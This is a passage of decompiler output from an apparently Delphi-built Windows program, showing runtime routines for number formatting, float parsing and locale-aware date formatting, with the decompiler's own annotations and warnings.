  __int16 *v11; // [esp+20h] [ebp-30h]
  __int16 v12; // [esp+24h] [ebp-2Ch]
  char v13; // [esp+27h] [ebp-29h]
  int v14; // [esp+3Ch] [ebp-14h]
  char v15; // [esp+43h] [ebp-Dh]
  int v16; // [esp+44h] [ebp-Ch]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v6 = 2;
  if ( a2 )
  {
    if ( *(_QWORD *)a1 )
      v6 = *(_DWORD *)(a1 + 4) >> 31;
  }
  else if ( *(_DWORD *)(a1 + 4) | *(_DWORD *)a1 | *(unsigned __int16 *)(a1 + 8) )
  {
    v6 = *(unsigned __int16 *)(a1 + 8) >> 15;
  }
  sub_416D97(v6, (int)&savedregs);
  if ( v7 )
    return unknown_libname_79(a4, 0, 15, 0);
  sub_416DE6((int)&savedregs, a3);
  v8 = v16;
  v9 = 9999;
  if ( !v15 )
  {
    v9 = v16 - v14;
    v8 = 18;
  }
  Sysutils::FloatToDecimal(v9, v8);
  if ( v12 == (__int16)0x8000 || v12 == 0x7FFF || !a2 && v12 > 18 && !v15 )
    return unknown_libname_79(a4, 0, 15, 0);
  if ( !v13 )
  {
    sub_416D97(2, (int)&savedregs);
    if ( v7 )
      return unknown_libname_79(a4, 0, 15, 0);
    if ( a3 != v11 )
      sub_416DE6((int)&savedregs, a3);
  }
  return sub_416EB9((int)&savedregs);
}
// 416D08: variable 'v7' is possibly undefined
// 416D0F: variable 'v16' is possibly undefined
// 416D1B: variable 'v15' is possibly undefined
// 416D20: variable 'v14' is possibly undefined
// 416D39: variable 'v12' is possibly undefined
// 416D75: variable 'v13' is possibly undefined
// 416D86: variable 'v11' is possibly undefined
// 41696C: using guessed type _DWORD __stdcall unknown_libname_79(_DWORD, _DWORD, _DWORD, char);
// 417020: using guessed type _DWORD __stdcall Sysutils::FloatToDecimal(_DWORD, _DWORD);

//----- (00416D97) --------------------------------------------------------
__int16 __usercall sub_416D97@<ax>(int a1@<ecx>, int a2@<ebp>)
{
  __int16 *v2; // esi
  __int16 v3; // ax
  __int16 result; // ax
  __int16 v5; // dx
  __int16 v6; // ax

  v2 = *(__int16 **)(a2 + 12);
  if ( a1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = *v2++;
        if ( v3 != 39 && v3 != 34 )
          break;
        v5 = v3;
        while ( 1 )
        {
          v6 = *v2++;
          if ( v6 == v5 )
            break;
          if ( !v6 )
            return **(_WORD **)(a2 + 12);
        }
      }
      if ( !v3 )
        break;
      if ( v3 == 59 && !--a1 )
      {
        result = *v2;
        if ( *v2 && result != 59 )
          return result;
        return **(_WORD **)(a2 + 12);
      }
    }
  }
  return **(_WORD **)(a2 + 12);
}

//----- (00416DE6) --------------------------------------------------------
int __usercall sub_416DE6@<eax>(int a1@<ebp>, __int16 *a2@<esi>)
{
  int v2; // ebx
  int v3; // ecx
  int v4; // edx
  __int16 v5; // ax
  __int16 v6; // ax
  bool v7; // zf
  int v8; // eax
  bool v9; // cc
  int v10; // eax
  int v11; // eax
  int result; // eax
  int v13; // [esp-4h] [ebp-8h]
  int v14; // [esp+0h] [ebp-4h]

  *(_DWORD *)(a1 - 48) = a2;
  v2 = 0x7FFF;
  v3 = 0;
  v4 = 0;
  *(_DWORD *)(a1 - 20) = -1;
  *(_BYTE *)(a1 - 49) = 0;
  *(_BYTE *)(a1 - 13) = 0;
  do
  {
LABEL_2:
    v5 = *a2++;
    while ( 1 )
    {
      switch ( v5 )
      {
        case '#':
          ++v4;
          goto LABEL_2;
        case '0':
          if ( v4 < v2 )
            v2 = v4;
          v3 = ++v4;
          goto LABEL_2;
        case '.':
          if ( *(_DWORD *)(a1 - 20) == -1 )
            *(_DWORD *)(a1 - 20) = v4;
          goto LABEL_2;
        case ',':
          *(_BYTE *)(a1 - 49) = 1;
          goto LABEL_2;
        case '\'':
        case '"':
          v13 = v2;
          LOWORD(v2) = v5;
          while ( 1 )
          {
            v6 = *a2++;
            v7 = v6 == (__int16)v2;
            if ( v6 == (_WORD)v2 )
            {
              v2 = v13;
              if ( v7 )
                goto LABEL_2;
            }
            if ( !v6 )
            {
              v2 = v14;
              goto LABEL_31;
            }
          }
      }
      if ( v5 != 69 && v5 != 101 )
        break;
      v5 = *a2++;
      if ( v5 == 45 || v5 == 43 )
      {
        *(_BYTE *)(a1 - 13) = 1;
        do
          v5 = *a2++;
        while ( v5 == 48 );
      }
    }
  }
  while ( v5 != 59 && v5 );
LABEL_31:
  *(_DWORD *)(a1 - 12) = v4;
  if ( *(_DWORD *)(a1 - 20) == -1 )
    *(_DWORD *)(a1 - 20) = v4;
  v8 = *(_DWORD *)(a1 - 20);
  v9 = v8 <= v3;
  v10 = v8 - v3;
  if ( !v9 )
    v10 = 0;
  *(_DWORD *)(a1 - 56) = v10;
  v11 = *(_DWORD *)(a1 - 20);
  v9 = v11 < v2;
  result = v11 - v2;
  if ( v9 )
    result = 0;
  *(_DWORD *)(a1 - 60) = result;
  return result;
}
// 416E71: variable 'v14' is possibly undefined

//----- (00416EB9) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int __usercall sub_416EB9@<eax>(int a1@<ebp>)
{
  int v1; // eax
  int v2; // edx
  __int16 *v3; // esi
  _WORD *v4; // edi
  _BYTE *v5; // ebx
  __int16 v6; // ax
  bool v7; // zf
  __int16 v8; // cx
  unsigned int v9; // ecx
  _BYTE *v11; // [esp-8h] [ebp-8h]
  _BYTE *v12; // [esp-8h] [ebp-8h]

  if ( *(_BYTE *)(a1 - 13) )
  {
    v1 = *(_DWORD *)(a1 - 20);
    v2 = 0;
  }
  else
  {
    v1 = *(__int16 *)(a1 - 44);
    if ( v1 <= *(_DWORD *)(a1 - 20) )
      v1 = *(_DWORD *)(a1 - 20);
    v2 = *(__int16 *)(a1 - 44) - *(_DWORD *)(a1 - 20);
  }
  *(_DWORD *)(a1 - 64) = v1;
  *(_DWORD *)(a1 - 68) = v2;
  v3 = *(__int16 **)(a1 - 48);
  v4 = *(_WORD **)(a1 - 4);
  v5 = (_BYTE *)(a1 - 41);
  if ( *(_BYTE *)(a1 - 42) && v3 == *(__int16 **)(a1 + 12) )
    *v4++ = 45;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        do
        {
          while ( 1 )
          {
            LOWORD(v1) = *v3++;
            if ( (_WORD)v1 != 35 && (_WORD)v1 != 48 )
              break;
            sub_416FA6(v1, v5, a1, v4);
          }
        }
        while ( (_WORD)v1 == 46 || (_WORD)v1 == 44 );
        if ( (_WORD)v1 != 39 && (_WORD)v1 != 34 )
          break;
        v11 = v5;
        LOWORD(v5) = v1;
        while ( 1 )
        {
          v6 = *v3++;
          v7 = v6 == (__int16)v5;
          if ( v6 == (_WORD)v5 )
          {
            v5 = v11;
            if ( v7 )
              break;
          }
          if ( !v6 )
            return ((unsigned int)v4 - *(_DWORD *)(a1 - 4)) >> 1;
          *v4++ = v6;
        }
      }
      if ( (_WORD)v1 != 69 && (_WORD)v1 != 101 )
        break;
      v8 = *v3;
      if ( *v3 != 43 )
      {
        if ( v8 != 45 )
          goto LABEL_19;
        LOBYTE(v8) = 0;
      }
      BYTE1(v1) = v8;
      v9 = -1;
      do
      {
        ++v9;
        ++v3;
      }
      while ( *v3 == 48 );
      if ( v9 >= 4 )
        v9 = 4;
      v12 = v5;
      LOBYTE(v5) = *(_BYTE *)(a1 - 41);
      BYTE1(v5) = 1;
      v1 = sub_416908(v1, *(__int16 *)(a1 - 44) - *(_DWORD *)(a1 - 20), v9, (int)v5, v4);
      v5 = v12;
    }
    if ( (_WORD)v1 == 59 || !(_WORD)v1 )
      return ((unsigned int)v4 - *(_DWORD *)(a1 - 4)) >> 1;
LABEL_19:
    *v4++ = v1;
  }
}
// 416F55: positive sp value 4 has been found
// 416F3A: variable 'v1' is possibly undefined

//----- (00416FA6) --------------------------------------------------------
char __usercall sub_416FA6@<al>(int a1@<eax>, _BYTE *a2@<ebx>, int a3@<ebp>, _WORD *a4@<edi>)
{
  if ( *(_DWORD *)(a3 - 68) )
  {
    if ( *(int *)(a3 - 68) < 0 )
    {
      ++*(_DWORD *)(a3 - 68);
      if ( *(_DWORD *)(a3 - 64) > *(_DWORD *)(a3 - 60) )
        JUMPOUT(0x417011);
      JUMPOUT(0x416FD9);
    }
    do
      LOBYTE(a1) = sub_416FC7(a1, a2, a3, a4);
    while ( (*(_DWORD *)(a3 - 68))-- != 1 );
  }
  return sub_416FC7(a1, a2, a3, a4);
}
// 416FC5: control flows out of bounds to 417011
// 416FC3: control flows out of bounds to 416FD9
// 416FAE: variable 'a1' is possibly undefined

//----- (00416FC7) --------------------------------------------------------
char __usercall sub_416FC7@<al>(int a1@<eax>, _BYTE *a2@<ebx>, int a3@<ebp>, _WORD *a4@<edi>)
{
  _WORD *v4; // edi
  __int16 v5; // t2

  LOWORD(a1) = (unsigned __int8)*a2;
  if ( !*a2 )
  {
    a1 = *(_DWORD *)(a3 - 64);
    if ( a1 <= *(_DWORD *)(a3 - 56) )
      goto LABEL_11;
    LOWORD(a1) = 48;
  }
  if ( *(_DWORD *)(a3 - 64) )
  {
    *a4 = a1;
    v4 = a4 + 1;
    if ( *(_BYTE *)(a3 - 49) )
    {
      a1 = *(_DWORD *)(a3 - 64);
      if ( a1 > 1 )
      {
        v5 = (unsigned __int16)a1 % 3u;
        LOBYTE(a1) = (unsigned __int16)a1 / 3u;
        if ( (_BYTE)v5 == 1 )
        {
          LOWORD(a1) = *(_WORD *)(a3 - 8);
          if ( (_WORD)a1 )
            *v4 = a1;
        }
      }
    }
  }
  else
  {
    a1 <<= 16;
    LOWORD(a1) = *(_WORD *)(a3 - 6);
    *(_DWORD *)a4 = a1;
  }
LABEL_11:
  --*(_DWORD *)(a3 - 64);
  return a1;
}

//----- (0041724C) --------------------------------------------------------
char __fastcall sub_41724C(__int16 *a1, long double *a2, char a3, int a4)
{
  __int16 *v4; // esi
  __int16 v6; // bx
  __int16 *v7; // ecx
  long double v8; // fst7
  int v9; // edx
  int v10; // eax
  char v11; // fps
  char result; // al
  __int16 v16; // [esp+12h] [ebp-Ah]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v4 = a1;
  v16 = *(_WORD *)(a4 + 194);
  __asm { fclex }
  sub_41731E(a1);
  v6 = *v4;
  if ( *v4 == 43 || v6 == 45 )
    ++v4;
  v8 = sub_41732F((int)&savedregs, v4, 0.0);
  if ( *v4 == v16 )
    v8 = sub_41732F((int)&savedregs, ++v4, v8);
  if ( v7 == v4 )
    goto LABEL_19;
  if ( (*v4 & 0xDF) == 69 )
    sub_417352(++v4);
  sub_41731E(v4);
  if ( *v4 )
    goto LABEL_19;
  v10 = v9;
  if ( a3 == 1 )
    v10 = v9 + 4;
  System::__linkproc__ Pow10(v10);
  if ( v6 == 45 )
    v8 = -v8;
  if ( a3 )
    *(_QWORD *)a2 = (__int64)v8;
  else
    *a2 = v8;
  if ( (v11 & 9) != 0 )
LABEL_19:
    result = 0;
  else
    result = 1;
  __asm { fclex }
  return result;
}
// 4172B5: variable 'v7' is possibly undefined
// 4172DB: variable 'v9' is possibly undefined
// 405358: using guessed type double __fastcall System::__linkproc__ Pow10(_DWORD);

//----- (0041731E) --------------------------------------------------------
__int16 __usercall sub_41731E@<ax>(__int16 *a1@<esi>)
{
  __int16 result; // ax

  do
    result = *a1++;
  while ( result == 32 );
  return result;
}

//----- (0041732F) --------------------------------------------------------
long double __usercall sub_41732F@<st0>(int a1@<ebp>, __int16 *a2@<esi>, long double result@<st0>)
{
  int v3; // eax
  int i; // edx
  __int16 v5; // ax
  bool v6; // cf
  long double v7; // fst7

  HIWORD(v3) = 0;
  for ( i = 0; ; ++i )
  {
    v5 = *a2++;
    v5 -= 58;
    v6 = __CFADD__(v5, 10);
    LOWORD(v3) = v5 + 10;
    if ( !v6 )
      break;
    v7 = result * (long double)dword_46643C;
    *(_DWORD *)(a1 - 16) = v3;
    result = v7 + (long double)*(int *)(a1 - 16);
  }
  return result;
}
// 46643C: using guessed type int dword_46643C;

//----- (00417352) --------------------------------------------------------
__int16 __usercall sub_417352@<ax>(_WORD *a1@<esi>)
{
  int v1; // eax
  unsigned int v2; // edx
  __int16 v3; // ax
  bool v4; // cf

  HIWORD(v1) = 0;
  v2 = 0;
  if ( *a1 == 43 || *a1 == 45 )
    ++a1;
  do
  {
    v3 = *a1 - 58;
    v4 = __CFADD__(v3, 10);
    LOWORD(v1) = v3 + 10;
    if ( !v4 )
      break;
    ++a1;
    v2 = v1 + 10 * v2;
  }
  while ( v2 < 0x1F4 );
  return v1;
}

//----- (004173D8) --------------------------------------------------------
_DWORD *__fastcall sub_4173D8(int a1, _DWORD *a2, int a3, char a4, int a5, int a6)
{
  int v7; // eax
  char v9[128]; // [esp+8h] [ebp-80h] BYREF

  v7 = sub_41698C(v9, (int)&a6, 0, 0, 15, 0, a1);
  return sub_406D90(a2, v9, v7);
}

//----- (0041740C) --------------------------------------------------------
_DWORD *__fastcall sub_41740C(int a1, _DWORD *a2, int a3, char a4, int a5)
{
  int v6; // eax
  char v8[128]; // [esp+8h] [ebp-80h] BYREF

  v6 = sub_41698C(v8, (int)&a5, 1, 0, 0, 0, a1);
  return sub_406D90(a2, v8, v6);
}

//----- (00417440) --------------------------------------------------------
_DWORD *__userpurge sub_417440@<eax>(
        int a1@<eax>,
        __int16 *a2@<edx>,
        int a3@<ecx>,
        int a4@<edi>,
        char a5,
        int a6,
        int a7)
{
  int v8; // ebx
  int v9; // eax
  int v10; // eax
  char v12[512]; // [esp+8h] [ebp-204h] BYREF
  int v13; // [esp+208h] [ebp-4h]
  int savedregs; // [esp+20Ch] [ebp+0h] BYREF

  v13 = a3;
  v8 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  if ( a1 > 224 )
    sub_414828((int)off_467FF4[0], (int)&savedregs, a4, (int)a2);
  v9 = sub_407790(v8);
  v10 = sub_416CAC((int)&a5, 0, a2, (int)a2, v9);
  return sub_406D90((_DWORD *)v13, v12, v10);
}
// 467FF4: using guessed type int **off_467FF4[3];
// 417440: using guessed type char var_204[512];

//----- (004174A0) --------------------------------------------------------
int sub_4174A0()
{
  return sub_4174AC();
}

//----- (004174AC) --------------------------------------------------------
// attributes: thunk
int sub_4174AC()
{
  return Sysutils::TryStrToFloat();
}
// 417398: using guessed type int Sysutils::TryStrToFloat(void);

//----- (004174B4) --------------------------------------------------------
int __fastcall sub_4174B4(int a1, double *a2)
{
  int v3; // edx
  long double v5; // [esp+0h] [ebp-10h] BYREF

  v3 = Sysutils::TryStrToFloat(a1, &v5);
  if ( (_BYTE)v3 && (v5 < dbl_465E40 || v5 > dbl_465E38) )
    v3 = 0;
  if ( (_BYTE)v3 )
    *a2 = v5;
  return v3;
}
// 417398: using guessed type int __fastcall Sysutils::TryStrToFloat(_DWORD, _DWORD);
// 465E38: using guessed type double dbl_465E38;
// 465E40: using guessed type double dbl_465E40;
// 4174B4: using guessed type long double var_10;

//----- (004174F8) --------------------------------------------------------
int __fastcall sub_4174F8(int a1, float *a2)
{
  int v3; // edx
  long double v5; // [esp+0h] [ebp-10h] BYREF

  v3 = Sysutils::TryStrToFloat(a1, &v5);
  if ( (_BYTE)v3 && (v5 < flt_465E34 || v5 > flt_465E30) )
    v3 = 0;
  if ( (_BYTE)v3 )
    *a2 = v5;
  return v3;
}
// 417398: using guessed type int __fastcall Sysutils::TryStrToFloat(_DWORD, _DWORD);
// 465E30: using guessed type float flt_465E30;
// 465E34: using guessed type float flt_465E34;
// 4174F8: using guessed type long double var_10;

//----- (0041753C) --------------------------------------------------------
// attributes: thunk
int sub_41753C()
{
  return Sysutils::TryStrToCurr();
}
// 4173B8: using guessed type int Sysutils::TryStrToCurr(void);

//----- (00417588) --------------------------------------------------------
int *__usercall sub_417588@<eax>(int *result@<eax>, int a2@<ebp>)
{
  int v2; // edx
  int v3; // [esp+0h] [ebp-14h] BYREF
  char v4; // [esp+4h] [ebp-10h]
  int v5; // [esp+8h] [ebp-Ch]
  char v6; // [esp+Ch] [ebp-8h]

  v2 = *result;
  if ( *result < 0 || result[1] <= 0 || v2 >= dword_466448 )
  {
    v3 = result[1];
    v4 = 0;
    v5 = v2;
    v6 = 0;
    return (int *)sub_414840((int)off_468204[0], (int)&v3, 1, a2);
  }
  return result;
}
// 466448: using guessed type int dword_466448;
// 468204: using guessed type int **off_468204[2];

//----- (00417624) --------------------------------------------------------
int __fastcall sub_417624(
        unsigned __int16 a1,
        unsigned __int16 a2,
        unsigned __int16 a3,
        unsigned __int16 a4,
        double *a5)
{
  int v6[2]; // [esp+4h] [ebp-Ch] BYREF
  unsigned __int8 v7; // [esp+Fh] [ebp-1h]

  v7 = 0;
  if ( a1 < 0x18u && a2 < 0x3Cu && a3 < 0x3Cu && a4 < 0x3E8u )
  {
    v6[0] = a4 + 1000 * a3 + 60000 * a2 + 3600000 * a1;
    v6[1] = 693594;
    *a5 = Sysutils::TimeStampToDateTime(v6);
    return 1;
  }
  return v7;
}
// 4175D0: using guessed type long double __fastcall Sysutils::TimeStampToDateTime(_DWORD);

//----- (00417A1C) --------------------------------------------------------
int __fastcall sub_417A1C(unsigned __int16 *a1, double *a2)
{
  int v4; // edx
  long double v5; // fst7
  double v7[2]; // [esp+0h] [ebp-10h] BYREF

  v4 = Sysutils::TryEncodeDate(a2);
  if ( (_BYTE)v4 )
  {
    v4 = sub_417624(a1[4], a1[5], a1[6], a1[7], v7);
    if ( *a2 < 0.0 )
      v5 = *a2 - v7[0];
    else
      v5 = *a2 + v7[0];
    *a2 = v5;
  }
  return v4;
}
// 417774: using guessed type _DWORD __stdcall Sysutils::TryEncodeDate(_DWORD);
// 417A1C: using guessed type double var_10[2];

//----- (00417B64) --------------------------------------------------------
int __usercall sub_417B64@<eax>(const void *a1@<eax>, int a2@<edx>, int a3)
{
  int result; // eax
  int v5; // eax
  int v6; // esi
  int v7; // [esp+8h] [ebp-8h]

  result = 256 - *(_DWORD *)(a3 - 520);
  if ( result >= a2 )
  {
    if ( a2 > 0 )
    {
      System::Move(a1, (void *)(a3 + 2 * *(_DWORD *)(a3 - 520) - 516), 2 * a2);
      result = a3;
      *(_DWORD *)(a3 - 520) += a2;
    }
  }
  else
  {
    v7 = *(_DWORD *)(a3 - 4);
    v5 = v7;
    if ( v7 )
      v5 = *(_DWORD *)(v7 - 4);
    v6 = v5;
    System::__linkproc__ DynArraySetLength(a2 + v5 + *(_DWORD *)(a3 - 520));
    if ( *(int *)(a3 - 520) > 0 )
    {
      System::Move((const void *)(a3 - 516), (void *)(*(_DWORD *)(a3 - 4) + 2 * v6), 2 * *(_DWORD *)(a3 - 520));
      v6 += *(_DWORD *)(a3 - 520);
    }
    System::Move(a1, (void *)(*(_DWORD *)(a3 - 4) + 2 * v6), 2 * a2);
    result = a3;
    *(_DWORD *)(a3 - 520) = 0;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00417C6C) --------------------------------------------------------
int __usercall sub_417C6C@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-30h] BYREF
  char v6; // [esp+Ch] [ebp-2Ch]
  int v7; // [esp+10h] [ebp-28h]
  char v8; // [esp+14h] [ebp-24h]
  _WORD v9[16]; // [esp+18h] [ebp-20h] BYREF

  v5 = a2;
  v6 = 0;
  v7 = a1;
  v8 = 0;
  v3 = sub_415B28(v9, 0x10u, (unsigned int)aD, 4u, (int)&v5, 1);
  return sub_417B64(v9, v3, a3);
}
// 46644C: using guessed type wchar_t aD[4];
// 417C6C: using guessed type _WORD var_20[16];

//----- (00417CB8) --------------------------------------------------------
int __cdecl sub_417CB8(int a1)
{
  _DWORD *v1; // eax
  int v2; // edx
  int result; // eax

  v1 = (_DWORD *)(a1 - 20);
  v2 = *(_DWORD *)(a1 - 20);
  while ( *(_WORD *)*v1 == *(_WORD *)(a1 - 22) )
    *v1 += 2;
  result = (*v1 - v2) / 2 + 1;
  *(_DWORD *)(a1 - 28) = result;
  return result;
}

//----- (00417CEC) --------------------------------------------------------
int __cdecl sub_417CEC(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 29) )
  {
    Sysutils::DecodeDate(
      a1 - 2,
      (unsigned __int16 *)(a1 - 4),
      (unsigned __int16 *)(a1 - 6),
      *(unsigned __int16 **)(*(_DWORD *)(a1 + 8) + 8));
    result = a1;
    *(_BYTE *)(a1 - 29) = 1;
  }
  return result;
}

//----- (00417D24) --------------------------------------------------------
int __cdecl sub_417D24(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 30) )
  {
    Sysutils::DecodeTime(
      a1 - 8,
      (unsigned __int16 *)(a1 - 10),
      (unsigned __int16 *)(a1 - 12),
      *(unsigned __int16 **)(*(_DWORD *)(a1 + 8) + 8),
      (unsigned __int16 *)(a1 - 14));
    result = a1;
    *(_BYTE *)(a1 - 30) = 1;
  }
  return result;
}

//----- (00417D64) --------------------------------------------------------
_DWORD *__usercall sub_417D64@<eax>(int *a1@<edx>, int a2@<eax>, int a3)
{
  LCID ThreadLocale; // eax
  int v6; // eax
  int v7; // esi
  WCHAR *v8; // esi
  int v9; // eax
  const WCHAR *v11; // [esp-18h] [ebp-238h]
  unsigned int v12[2]; // [esp-Ch] [ebp-22Ch] BYREF
  int *v13; // [esp-4h] [ebp-224h]
  int v14; // [esp+8h] [ebp-218h] BYREF
  WCHAR DateStr[256]; // [esp+Ch] [ebp-214h] BYREF
  SYSTEMTIME Date; // [esp+20Ch] [ebp-14h] BYREF
  __int32 v17; // [esp+21Ch] [ebp-4h] BYREF
  int savedregs; // [esp+220h] [ebp+0h] BYREF

  v14 = 0;
  v17 = 0;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_417EBE;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_406C44(a1);
  Date.wYear = *(_WORD *)(a3 - 2);
  Date.wMonth = *(_WORD *)(a3 - 4);
  Date.wDay = *(_WORD *)(a3 - 6);
  sub_407030(&v17, (__int32)L"gg");
  v11 = (const WCHAR *)sub_407790(v17);
  ThreadLocale = GetThreadLocale();
  if ( GetDateFormatW(ThreadLocale, 4u, &Date, v11, DateStr, 512) )
  {
    unknown_libname_51(a1, DateStr, 256);
    if ( a2 == 1 )
    {
      if ( dword_46C68C == 4 )
      {
        if ( dword_46C690 == 1 )
        {
          v7 = *a1;
          if ( *a1 )
            v7 = *(_DWORD *)(v7 - 4);
          if ( Sysutils::ByteToCharLen(*a1, v7) == 4 )
          {
            v8 = &DateStr[sub_41B640(*a1, 3) - 1];
            unknown_libname_50(&v14, v8);
            v9 = sub_41B6D4(v14, 2);
            sub_406D90(a1, v8, v9);
          }
        }
      }
      else if ( dword_46C68C == 17 )
      {
        v6 = sub_41B6D4(*a1, 1);
        sub_407AD8(*a1, 1, v6, a1);
      }
    }
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_417EC5;
  sub_406C44(&v14);
  return sub_406C44(&v17);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 417ED8: using guessed type wchar_t aGg[3];
// 46C68C: using guessed type int dword_46C68C;
// 46C690: using guessed type int dword_46C690;
// 417D64: using guessed type WCHAR DateStr[256];

//----- (00417EE0) --------------------------------------------------------
_DWORD *__usercall sub_417EE0@<eax>(int a1@<eax>, int *a2@<edx>, int a3)
{
  LCID ThreadLocale; // eax
  int v6; // esi
  const WCHAR *v8; // [esp-18h] [ebp-234h]
  unsigned int v9[2]; // [esp-Ch] [ebp-228h] BYREF
  int *v10; // [esp-4h] [ebp-220h]
  WCHAR DateStr[256]; // [esp+8h] [ebp-214h] BYREF
  SYSTEMTIME Date; // [esp+208h] [ebp-14h] BYREF
  __int32 v13; // [esp+218h] [ebp-4h] BYREF
  int savedregs; // [esp+21Ch] [ebp+0h] BYREF

  v13 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_417FC3;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_406C44(a2);
  Date.wYear = *(_WORD *)(a3 - 2);
  Date.wMonth = *(_WORD *)(a3 - 4);
  Date.wDay = *(_WORD *)(a3 - 6);
  if ( a1 > 2 )
    sub_407030(&v13, (__int32)L"yyyy");
  else
    sub_407030(&v13, (__int32)L"yy");
  v8 = (const WCHAR *)sub_407790(v13);
  ThreadLocale = GetThreadLocale();
  if ( GetDateFormatW(ThreadLocale, 4u, &Date, v8, DateStr, 512) )
  {
    unknown_libname_51(a2, DateStr, 256);
    if ( a1 == 1 && *(_WORD *)*a2 == 48 )
    {
      v6 = *a2;
      if ( *a2 )
        v6 = *(_DWORD *)(v6 - 4);
      sub_407AD8(*a2, 2, v6 - 1, a2);
    }
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_417FCA;
  return sub_406C44(&v13);
}
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 417FDC: using guessed type wchar_t aYy[3];
// 417FF0: using guessed type wchar_t aYyyy[5];

//----- (00417FFC) --------------------------------------------------------
int __usercall sub_417FFC@<eax>(unsigned __int16 *a1@<eax>, int System::TDateTime)
{
  int v3; // edx
  unsigned __int16 v4; // bx
  unsigned __int16 *v5; // edi
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned __int16 *v11; // edi
  unsigned __int16 *v12; // edi
  unsigned __int16 v14; // si
  unsigned int v16[2]; // [esp-Ch] [ebp-48h] BYREF
  int *v17; // [esp-4h] [ebp-40h]
  int v18; // [esp+Ch] [ebp-30h] BYREF
  int v19; // [esp+10h] [ebp-2Ch] BYREF
  unsigned __int16 v20; // [esp+14h] [ebp-28h]
  unsigned __int16 v21; // [esp+16h] [ebp-26h]
  unsigned __int16 v22; // [esp+18h] [ebp-24h]
  char v23; // [esp+1Ah] [ebp-22h]
  char v24; // [esp+1Bh] [ebp-21h]
  unsigned __int16 v25; // [esp+1Ch] [ebp-20h]
  char v26; // [esp+1Eh] [ebp-1Eh]
  char v27; // [esp+1Fh] [ebp-1Dh]
  int v28; // [esp+20h] [ebp-1Ch]
  unsigned __int16 v29; // [esp+26h] [ebp-16h] BYREF
  unsigned __int16 *v30; // [esp+28h] [ebp-14h]
  unsigned __int16 v31; // [esp+2Eh] [ebp-Eh]
  unsigned __int16 v32; // [esp+30h] [ebp-Ch]
  unsigned __int16 v33; // [esp+32h] [ebp-Ah]
  unsigned __int16 v34; // [esp+34h] [ebp-8h]
  unsigned __int16 v35; // [esp+36h] [ebp-6h]
  unsigned __int16 v36; // [esp+38h] [ebp-4h]
  unsigned __int16 v37; // [esp+3Ah] [ebp-2h]
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v18 = 0;
  v19 = 0;
  v30 = a1;
  v17 = &savedregs;
  v16[1] = (unsigned int)&loc_418887;
  v16[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v16);
  if ( a1 && *(int *)(System::TDateTime - 524) < 2 )
  {
    ++*(_DWORD *)(System::TDateTime - 524);
    v25 = 32;
    v27 = 0;
    v26 = 0;
    v24 = 0;
    while ( 1 )
    {
      while ( 1 )
      {
LABEL_112:
        v14 = *v30;
        if ( !*v30 )
        {
          --*(_DWORD *)(System::TDateTime - 524);
          goto LABEL_114;
        }
        v29 = *v30;
        if ( v14 < 0xD800u || v29 > 0xDFFFu )
          break;
        v3 = sub_41B738(v30) / 2;
        sub_417B64(v30, v3, System::TDateTime);
        v30 = sub_41B768(v30);
        v25 = 32;
      }
      v30 = sub_41B768(v30);
      v4 = v29;
      if ( (unsigned __int16)(v29 - 97) < 0x1Au )
        v4 = v29 - 32;
      if ( (unsigned __int16)(v4 - 65) < 0x1Au )
      {
        if ( v4 == 77 && v25 == 72 )
          v4 = 78;
        v25 = v4;
      }
      switch ( v4 )
      {
        case '"':
        case '\'':
          v12 = v30;
          while ( *v30 && *v30 != v29 )
          {
            v20 = *v30;
            if ( v20 >= 0xD800u && v20 <= 0xDFFFu )
              v30 = sub_41B768(v30);
            else
              ++v30;
          }
          sub_417B64(v12, v30 - v12, System::TDateTime);
          if ( *v30 )
            ++v30;
          goto LABEL_112;
        case '/':
          if ( *(_WORD *)(*(_DWORD *)(System::TDateTime - 528) + 6) )
            sub_417B64((const void *)(*(_DWORD *)(System::TDateTime - 528) + 6), 1, System::TDateTime);
          goto LABEL_112;
        case ':':
          if ( *(_WORD *)(*(_DWORD *)(System::TDateTime - 528) + 8) )
            sub_417B64((const void *)(*(_DWORD *)(System::TDateTime - 528) + 8), 1, System::TDateTime);
          goto LABEL_112;
        case 'A':
          sub_417D24((int)&savedregs);
          v11 = v30 - 1;
          if ( sub_415978(v30 - 1, L"AM/PM", 5u) )
          {
            if ( sub_415978(v11, L"A/P", 3u) )
            {
              if ( sub_415978(v11, L"AMPM", 4u) )
              {
                if ( sub_415978(v11, off_4188B8, 4u) )
                {
                  if ( sub_415978(v11, &off_4188C4, 3u) )
                    goto LABEL_111;
                  sub_417CEC((int)&savedregs);
                  Sysutils::DayOfWeek(System::TDateTime);
                  unknown_libname_80(System::TDateTime);
                  v30 += 2;
                }
                else
                {
                  sub_417CEC((int)&savedregs);
                  Sysutils::DayOfWeek(System::TDateTime);
                  unknown_libname_80(System::TDateTime);
                  v30 += 3;
                }
              }
              else
              {
                unknown_libname_80(System::TDateTime);
                v30 += 3;
